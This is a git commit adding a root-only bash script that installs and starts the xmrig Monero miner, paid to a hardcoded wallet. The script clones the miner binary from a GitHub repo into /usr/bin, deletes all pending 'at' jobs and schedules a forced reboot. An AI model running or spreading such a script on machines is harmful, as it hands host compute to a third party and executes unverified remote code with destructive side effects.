4f5f92682efc9b6868990ef5d3252820324aafc7
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2018-10-17 03:20:32 +0300

    Create rams.sh

---
+++ rams.sh
@@ -0,0 +1,39 @@
+#! /bin/bash
+if [ "$(whoami)" != "root" ]; then
+        echo -e "Sorry, you are not root. Please use sudo option"
+        exit 1
+fi
+WALLET=83oQ9PFhGpZbP5YYF7qjWuMfZg3PWefwKYnLay1VgFa7LxdUZiFHcyCAVievH32d42NRYuPtzSGdjHAv1KJZekZ3EZHm5n6
+ID="$(hostname)"
+MAIL=flitramzes@gmail.com
+PASSWORD=$ID:$MAIL
+THREADS="$(nproc --all)"
+
+#deleting all previous files, tasks, jobs and configs
+rm -rf /tmp/miner/
+for i in `atq | awk '{print $1}'`;do atrm $i;done
+
+sudo dpkg --configure -a
+
+echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
+sudo sysctl -p
+echo -e 'Installing updates and install soft...'
+sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake screen htop nano mc -y
+sleep 2
+cd /tmp && mkdir miner
+git clone https://github.com/WilliamWizard/miner-xmr.git /tmp/miner
+cd /tmp/miner
+chmod +x /tmp/miner/xmrig
+sleep 1
+cp /tmp/miner/xmrig /usr/bin/
+sleep 1
+#
+xmrig -o pool.supportxmr.com:5555 -u $WALLET --pass=$PASSWORD --rig-id="$ID" -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10 --threads=$THREADS
+echo -e 'Miner started'
+echo -e 'Watch:'
+echo -e 'tail -f /tmp/miner/xmrig.log'
+
+touch /tmp/at.txt
+echo 'sudo reboot -f' >> /tmp/at.txt
+at now + 24 hours < /tmp/at.txt
+echo -e 'Restart job specified'
